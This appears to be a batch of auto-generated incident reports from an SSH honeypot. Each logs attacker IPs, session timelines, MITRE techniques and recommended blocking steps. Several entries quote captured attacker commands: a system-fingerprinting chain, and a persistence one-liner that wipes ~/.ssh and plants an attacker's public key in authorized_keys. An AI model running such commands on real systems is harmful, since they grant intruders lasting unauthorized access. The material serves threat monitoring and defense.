### 🔴 HIGH · IR-598b66ee3c4d

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:40 |
| **Last Seen** | 2026-07-06 13:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:40:59` | `cowrie.session.connect` |
| `2026-07-06 13:41:00` | `cowrie.client.version` |
| `2026-07-06 13:41:00` | `cowrie.client.kex` |
| `2026-07-06 13:41:01` | `cowrie.login.success` |
| `2026-07-06 13:41:03` | `cowrie.session.params` |
| `2026-07-06 13:41:03` | `cowrie.command.input` |
| `2026-07-06 13:41:03` | `cowrie.command.input` |
| `2026-07-06 13:41:03` | `cowrie.command.input` |
| `2026-07-06 13:41:03` | `cowrie.command.input` |
| `2026-07-06 13:41:03` | `cowrie.command.input` |
| `2026-07-06 13:41:03` | `cowrie.command.success` |
| `2026-07-06 13:41:03` | `cowrie.command.input` |
| `2026-07-06 13:41:03` | `cowrie.command.input` |
| `2026-07-06 13:41:03` | `cowrie.command.input` |
| `2026-07-06 13:41:03` | `cowrie.command.input` |
| `2026-07-06 13:41:03` | `cowrie.log.closed` |
| `2026-07-06 13:41:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a62d838d9f67

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:41 |
| **Last Seen** | 2026-07-06 13:41 |
| **Session Duration** | 41s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:41:11` | `cowrie.session.connect` |
| `2026-07-06 13:41:15` | `cowrie.client.version` |
| `2026-07-06 13:41:15` | `cowrie.client.kex` |
| `2026-07-06 13:41:36` | `cowrie.login.success` |
| `2026-07-06 13:41:45` | `cowrie.session.params` |
| `2026-07-06 13:41:45` | `cowrie.command.input` |
| `2026-07-06 13:41:45` | `cowrie.command.input` |
| `2026-07-06 13:41:45` | `cowrie.command.input` |
| `2026-07-06 13:41:45` | `cowrie.command.input` |
| `2026-07-06 13:41:45` | `cowrie.command.input` |
| `2026-07-06 13:41:45` | `cowrie.command.success` |
| `2026-07-06 13:41:45` | `cowrie.command.input` |
| `2026-07-06 13:41:45` | `cowrie.command.input` |
| `2026-07-06 13:41:45` | `cowrie.command.input` |
| `2026-07-06 13:41:45` | `cowrie.command.input` |
| `2026-07-06 13:41:50` | `cowrie.log.closed` |
| `2026-07-06 13:41:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9fcafc7f74c

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-07-06 13:41 |
| **Last Seen** | 2026-07-06 13:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:41:45` | `cowrie.session.connect` |
| `2026-07-06 13:41:45` | `cowrie.client.version` |
| `2026-07-06 13:41:45` | `cowrie.client.kex` |
| `2026-07-06 13:41:46` | `cowrie.login.success` |
| `2026-07-06 13:41:47` | `cowrie.session.params` |
| `2026-07-06 13:41:47` | `cowrie.command.input` |
| `2026-07-06 13:41:47` | `cowrie.command.failed` |
| `2026-07-06 13:41:48` | `cowrie.log.closed` |
| `2026-07-06 13:41:49` | `cowrie.session.params` |
| `2026-07-06 13:41:49` | `cowrie.command.input` |
| `2026-07-06 13:41:49` | `cowrie.session.file_download` |
| `2026-07-06 13:41:49` | `cowrie.log.closed` |
| `2026-07-06 13:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9c5fbcce41ab

| Field | Detail |
|---|---|
| **Source IP** | `122.168.123[.]73` |
| **First Seen** | 2026-07-06 13:41 |
| **Last Seen** | 2026-07-06 13:41 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:41:49` | `cowrie.session.connect` |
| `2026-07-06 13:41:49` | `cowrie.client.version` |
| `2026-07-06 13:41:49` | `cowrie.client.kex` |
| `2026-07-06 13:41:50` | `cowrie.login.success` |
| `2026-07-06 13:41:51` | `cowrie.session.params` |
| `2026-07-06 13:41:51` | `cowrie.command.input` |
| `2026-07-06 13:41:51` | `cowrie.command.failed` |
| `2026-07-06 13:41:52` | `cowrie.log.closed` |
| `2026-07-06 13:41:53` | `cowrie.session.params` |
| `2026-07-06 13:41:53` | `cowrie.command.input` |
| `2026-07-06 13:41:53` | `cowrie.session.file_download` |
| `2026-07-06 13:41:53` | `cowrie.log.closed` |
| `2026-07-06 13:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.123[.]73` to AbuseIPDB if not already reported
- [ ] Block `122.168.123[.]73` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12fd89748ef0

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-07-06 13:41 |
| **Last Seen** | 2026-07-06 13:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:41:49` | `cowrie.session.connect` |
| `2026-07-06 13:41:49` | `cowrie.client.version` |
| `2026-07-06 13:41:49` | `cowrie.client.kex` |
| `2026-07-06 13:41:50` | `cowrie.login.success` |
| `2026-07-06 13:41:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8b4ac6f9dbfb

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]100` |
| **First Seen** | 2026-07-06 13:41 |
| **Last Seen** | 2026-07-06 13:41 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:41:51` | `cowrie.session.connect` |
| `2026-07-06 13:41:51` | `cowrie.client.version` |
| `2026-07-06 13:41:51` | `cowrie.client.kex` |
| `2026-07-06 13:41:52` | `cowrie.login.success` |
| `2026-07-06 13:41:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]100` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]100` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-31f7830bd9f3

| Field | Detail |
|---|---|
| **Source IP** | `122.168.123[.]73` |
| **First Seen** | 2026-07-06 13:41 |
| **Last Seen** | 2026-07-06 13:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:41:54` | `cowrie.session.connect` |
| `2026-07-06 13:41:54` | `cowrie.client.version` |
| `2026-07-06 13:41:54` | `cowrie.client.kex` |
| `2026-07-06 13:41:55` | `cowrie.login.success` |
| `2026-07-06 13:41:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.123[.]73` to AbuseIPDB if not already reported
- [ ] Block `122.168.123[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5015c303ddb7

| Field | Detail |
|---|---|
| **Source IP** | `122.168.123[.]73` |
| **First Seen** | 2026-07-06 13:41 |
| **Last Seen** | 2026-07-06 13:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:41:56` | `cowrie.session.connect` |
| `2026-07-06 13:41:56` | `cowrie.client.version` |
| `2026-07-06 13:41:56` | `cowrie.client.kex` |
| `2026-07-06 13:41:57` | `cowrie.login.success` |
| `2026-07-06 13:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.168.123[.]73` to AbuseIPDB if not already reported
- [ ] Block `122.168.123[.]73` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cabb3d0f631

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:42 |
| **Last Seen** | 2026-07-06 13:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:42:18` | `cowrie.session.connect` |
| `2026-07-06 13:42:19` | `cowrie.client.version` |
| `2026-07-06 13:42:19` | `cowrie.client.kex` |
| `2026-07-06 13:42:21` | `cowrie.login.success` |
| `2026-07-06 13:42:22` | `cowrie.session.params` |
| `2026-07-06 13:42:22` | `cowrie.command.input` |
| `2026-07-06 13:42:22` | `cowrie.command.input` |
| `2026-07-06 13:42:22` | `cowrie.command.input` |
| `2026-07-06 13:42:22` | `cowrie.command.input` |
| `2026-07-06 13:42:22` | `cowrie.command.input` |
| `2026-07-06 13:42:22` | `cowrie.command.success` |
| `2026-07-06 13:42:22` | `cowrie.command.input` |
| `2026-07-06 13:42:22` | `cowrie.command.input` |
| `2026-07-06 13:42:22` | `cowrie.command.input` |
| `2026-07-06 13:42:22` | `cowrie.command.input` |
| `2026-07-06 13:42:23` | `cowrie.log.closed` |
| `2026-07-06 13:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2c7d753ecb82

| Field | Detail |
|---|---|
| **Source IP** | `31.76.78[.]140` |
| **First Seen** | 2026-07-06 13:43 |
| **Last Seen** | 2026-07-06 13:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:43:14` | `cowrie.session.connect` |
| `2026-07-06 13:43:14` | `cowrie.client.version` |
| `2026-07-06 13:43:14` | `cowrie.client.kex` |
| `2026-07-06 13:43:15` | `cowrie.login.success` |
| `2026-07-06 13:43:16` | `cowrie.session.params` |
| `2026-07-06 13:43:16` | `cowrie.command.input` |
| `2026-07-06 13:43:16` | `cowrie.command.failed` |
| `2026-07-06 13:43:16` | `cowrie.log.closed` |
| `2026-07-06 13:43:16` | `cowrie.session.params` |
| `2026-07-06 13:43:16` | `cowrie.command.input` |
| `2026-07-06 13:43:17` | `cowrie.session.file_download` |
| `2026-07-06 13:43:17` | `cowrie.log.closed` |
| `2026-07-06 13:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.76.78[.]140` to AbuseIPDB if not already reported
- [ ] Block `31.76.78[.]140` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64a96a1b6a6c

| Field | Detail |
|---|---|
| **Source IP** | `31.76.78[.]140` |
| **First Seen** | 2026-07-06 13:43 |
| **Last Seen** | 2026-07-06 13:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:43:17` | `cowrie.session.connect` |
| `2026-07-06 13:43:17` | `cowrie.client.version` |
| `2026-07-06 13:43:17` | `cowrie.client.kex` |
| `2026-07-06 13:43:17` | `cowrie.login.success` |
| `2026-07-06 13:43:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.76.78[.]140` to AbuseIPDB if not already reported
- [ ] Block `31.76.78[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8ad37c18a24e

| Field | Detail |
|---|---|
| **Source IP** | `31.76.78[.]140` |
| **First Seen** | 2026-07-06 13:43 |
| **Last Seen** | 2026-07-06 13:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:43:17` | `cowrie.session.connect` |
| `2026-07-06 13:43:17` | `cowrie.client.version` |
| `2026-07-06 13:43:17` | `cowrie.client.kex` |
| `2026-07-06 13:43:18` | `cowrie.login.success` |
| `2026-07-06 13:43:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.76.78[.]140` to AbuseIPDB if not already reported
- [ ] Block `31.76.78[.]140` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cf6d2b91ae3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:43 |
| **Last Seen** | 2026-07-06 13:44 |
| **Session Duration** | 43s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:43:28` | `cowrie.session.connect` |
| `2026-07-06 13:43:33` | `cowrie.client.version` |
| `2026-07-06 13:43:33` | `cowrie.client.kex` |
| `2026-07-06 13:43:53` | `cowrie.login.success` |
| `2026-07-06 13:44:03` | `cowrie.session.params` |
| `2026-07-06 13:44:03` | `cowrie.command.input` |
| `2026-07-06 13:44:03` | `cowrie.command.input` |
| `2026-07-06 13:44:03` | `cowrie.command.input` |
| `2026-07-06 13:44:03` | `cowrie.command.input` |
| `2026-07-06 13:44:03` | `cowrie.command.input` |
| `2026-07-06 13:44:03` | `cowrie.command.success` |
| `2026-07-06 13:44:03` | `cowrie.command.input` |
| `2026-07-06 13:44:03` | `cowrie.command.input` |
| `2026-07-06 13:44:03` | `cowrie.command.input` |
| `2026-07-06 13:44:03` | `cowrie.command.input` |
| `2026-07-06 13:44:09` | `cowrie.log.closed` |
| `2026-07-06 13:44:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f073321558b6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:43 |
| **Last Seen** | 2026-07-06 13:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:43:40` | `cowrie.session.connect` |
| `2026-07-06 13:43:40` | `cowrie.client.version` |
| `2026-07-06 13:43:40` | `cowrie.client.kex` |
| `2026-07-06 13:43:42` | `cowrie.login.success` |
| `2026-07-06 13:43:43` | `cowrie.session.params` |
| `2026-07-06 13:43:43` | `cowrie.command.input` |
| `2026-07-06 13:43:43` | `cowrie.command.input` |
| `2026-07-06 13:43:43` | `cowrie.command.input` |
| `2026-07-06 13:43:43` | `cowrie.command.input` |
| `2026-07-06 13:43:43` | `cowrie.command.input` |
| `2026-07-06 13:43:43` | `cowrie.command.success` |
| `2026-07-06 13:43:43` | `cowrie.command.input` |
| `2026-07-06 13:43:43` | `cowrie.command.input` |
| `2026-07-06 13:43:43` | `cowrie.command.input` |
| `2026-07-06 13:43:43` | `cowrie.command.input` |
| `2026-07-06 13:43:44` | `cowrie.log.closed` |
| `2026-07-06 13:43:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b4fcda905ce

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]6` |
| **First Seen** | 2026-07-06 13:45 |
| **Last Seen** | 2026-07-06 13:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:45:00` | `cowrie.session.connect` |
| `2026-07-06 13:45:01` | `cowrie.client.version` |
| `2026-07-06 13:45:01` | `cowrie.client.kex` |
| `2026-07-06 13:45:03` | `cowrie.login.success` |
| `2026-07-06 13:45:04` | `cowrie.session.params` |
| `2026-07-06 13:45:04` | `cowrie.command.input` |
| `2026-07-06 13:45:04` | `cowrie.command.input` |
| `2026-07-06 13:45:04` | `cowrie.command.input` |
| `2026-07-06 13:45:04` | `cowrie.command.input` |
| `2026-07-06 13:45:04` | `cowrie.command.input` |
| `2026-07-06 13:45:04` | `cowrie.command.success` |
| `2026-07-06 13:45:04` | `cowrie.command.input` |
| `2026-07-06 13:45:04` | `cowrie.command.input` |
| `2026-07-06 13:45:04` | `cowrie.command.input` |
| `2026-07-06 13:45:04` | `cowrie.command.input` |
| `2026-07-06 13:45:05` | `cowrie.log.closed` |
| `2026-07-06 13:45:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]6` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]6` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36e5c5b5f21a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-06 13:45 |
| **Last Seen** | 2026-07-06 13:46 |
| **Session Duration** | 45s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-06 13:45:33` | `cowrie.session.connect` |
| `2026-07-06 13:45:38` | `cowrie.client.version` |
| `2026-07-06 13:45:38` | `cowrie.client.kex` |
| `2026-07-06 13:46:00` | `cowrie.login.success` |
| `2026-07-06 13:46:09` | `cowrie.session.params` |
| `2026-07-06 13:46:09` | `cowrie.command.input` |
| `2026-07-06 13:46:09` | `cowrie.command.input` |
| `2026-07-06 13:46:09` | `cowrie.command.input` |
